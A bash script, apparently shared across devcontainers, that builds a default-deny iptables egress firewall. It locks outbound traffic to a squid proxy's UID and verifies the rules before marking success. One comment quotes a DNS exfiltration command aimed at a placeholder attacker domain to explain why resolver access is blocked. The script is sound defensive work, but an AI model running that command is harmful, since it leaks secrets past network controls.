#!/usr/bin/env bash
# CANONICAL egress firewall — proxy-only model. Shared, identical across all
# devcontainers. DO NOT edit per-project copies: edit THIS file in
# Projects/devcontainer-egress/ and run ./sync.sh, then rebuild.
#
# Baked into each image at /usr/local/sbin/egress-firewall; invoked by the root
# entrypoint on every start. Egress is locked to the squid proxy's UID only;
# everything else must go through the proxy on 127.0.0.1:3128 where squid
# enforces the hostname allowlist. A process that ignores HTTPS_PROXY and
# connects directly is dropped here (its socket UID isn't `proxy`).
#
# Per-project parameters are DATA, not code:
#   - /etc/squid/allowlist.txt    : the hostname allowlist (per project)
#   - /etc/egress/inbound-ports   : optional, one TCP port per line, for projects
#                                   that publish services (Vision/Watchman). Absent
#                                   = no inbound (Brain/git-agent).

set -uo pipefail

PROXY_USER="proxy"
SENTINEL="/run/egress-firewall-ok"
INBOUND_FILE="/etc/egress/inbound-ports"
EXTRA_RULES="/etc/egress/extra-rules.sh"   # optional per-project OUTPUT exceptions

# Stale sentinel must never outlive a re-apply.
rm -f "$SENTINEL" 2>/dev/null || true

# --- FAIL-CLOSED FIRST: default-deny before flushing/adding anything. ---
iptables  -P INPUT   DROP
iptables  -P OUTPUT  DROP
iptables  -P FORWARD DROP
ip6tables -P INPUT   DROP
ip6tables -P OUTPUT  DROP
ip6tables -P FORWARD DROP

# --- Reset rules (policies set above stay DROP across a flush) ---
iptables -F
iptables -F EGRESS_DENY 2>/dev/null || true
iptables -X EGRESS_DENY 2>/dev/null || true
iptables -X 2>/dev/null || true
# Do NOT flush NAT: embedded Docker DNS (127.0.0.11) is NAT-based; flushing
# would break name resolution. We add no NAT rules of our own.
ip6tables -F
ip6tables -X 2>/dev/null || true

# --- IPv6: loopback only ---
ip6tables -A INPUT  -i lo -j ACCEPT
ip6tables -A OUTPUT -o lo -j ACCEPT

# --- IPv4 base allows ---
iptables -A INPUT  -i lo -j ACCEPT
# Block non-proxy processes from the embedded Docker DNS resolver (127.0.0.11):
# a blanket loopback-OUTPUT accept would let any process tunnel data out via DNS
# queries (`dig $(secret).attacker.tld`) that Docker forwards to the host's upstream
# resolvers, bypassing the squid hostname allowlist entirely. The proxy UID (which
# does the real name resolution for allowed hosts) is exempted; every other loopback
# service stays reachable (incl. squid on 3128). DNS is UDP with TCP fallback, so
# both are dropped. Insert BEFORE the blanket loopback accept so it takes precedence.
iptables -A OUTPUT -o lo -d 127.0.0.11 -p udp --dport 53 -m owner ! --uid-owner "$PROXY_USER" -j DROP
iptables -A OUTPUT -o lo -d 127.0.0.11 -p tcp --dport 53 -m owner ! --uid-owner "$PROXY_USER" -j DROP
iptables -A OUTPUT -o lo -j ACCEPT
iptables -A INPUT  -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
# OUTPUT: accept ESTABLISHED only — NOT RELATED. The proxy UID's blanket ACCEPT
# below already covers every legitimate outbound flow, so non-proxy UIDs lose
# nothing by dropping RELATED; this removes the (remote) chance that a conntrack
# protocol helper could open a RELATED data channel that skips the UID lock.
iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT

# Only the proxy UID may originate outbound traffic; everything else uses the
# proxy over loopback.
iptables -A OUTPUT -m owner --uid-owner "$PROXY_USER" -j ACCEPT

# Inbound on forwarded ports, if this project declares any (host browser -> app).
if [[ -r "$INBOUND_FILE" ]]; then
  # `|| [[ -n "$port" ]]` so a final line with no trailing newline is not dropped.
  while read -r port || [[ -n "$port" ]]; do
    [[ "$port" =~ ^[0-9]+$ ]] && iptables -A INPUT -p tcp --dport "$port" -j ACCEPT
  done < "$INBOUND_FILE"
fi

# Project-specific extra OUTPUT allows (e.g. Brain's host-Ollama hole), run AFTER
# the base allows and BEFORE the catch-all deny. Optional, project-owned file —
# each rule it adds is a deliberate exception.
[[ -x "$EXTRA_RULES" ]] && "$EXTRA_RULES" || true

# Logged-DROP for everything else, rate-limited. Visible via `dmesg | grep egress-deny`.
iptables -N EGRESS_DENY
iptables -A EGRESS_DENY -m limit --limit 10/min -j LOG --log-prefix "egress-deny: " --log-level 4
iptables -A EGRESS_DENY -j DROP
iptables -A OUTPUT -j EGRESS_DENY

# --- Verify the lock took, then drop the sentinel ---
# Three independent invariants must ALL hold (script runs without `set -e`, so a
# mid-script `iptables -A` failure can't be assumed to have aborted): default
# policy is DROP, the proxy-UID ACCEPT exists, and the catch-all EGRESS_DENY jump
# is present (so a ruleset that silently lost the deny/audit rule fails closed).
if iptables -S OUTPUT 2>/dev/null | grep -q '^-P OUTPUT DROP' \
   && iptables -C OUTPUT -m owner --uid-owner "$PROXY_USER" -j ACCEPT 2>/dev/null \
   && iptables -C OUTPUT -j EGRESS_DENY 2>/dev/null; then
  : > "$SENTINEL" 2>/dev/null || true
  echo "[firewall] Egress locked to proxy UID '$PROXY_USER' (IPv4 + IPv6 default-deny, verified)."
else
  rm -f "$SENTINEL" 2>/dev/null || true
  echo "[firewall] ERROR: egress-lock verification FAILED — egress stays default-DROP (fail-closed)." >&2
  exit 1
fi
